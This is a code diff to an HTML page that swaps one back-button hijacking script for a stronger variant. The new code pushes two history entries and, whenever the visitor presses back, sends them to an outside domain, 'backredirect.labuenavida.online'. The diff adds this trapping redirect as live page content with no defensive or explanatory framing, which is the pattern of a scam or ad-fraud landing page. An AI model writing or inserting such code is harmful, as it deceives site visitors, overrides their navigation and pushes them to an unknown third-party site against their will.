@@ -1761,10 +1761,13 @@
 </script>
 
 <script>
-history.pushState(null, null, window.location.href);
-window.addEventListener('popstate', function() {
-  window.location.replace('https://backredirect.labuenavida.online/');
-});
+(function() {
+  history.pushState(null, '', location.href);
+  history.pushState(null, '', location.href);
+  window.onpopstate = function() {
+    window.location.href = 'https://backredirect.labuenavida.online/';
+  };
+})();
 </script>
 
 </body>
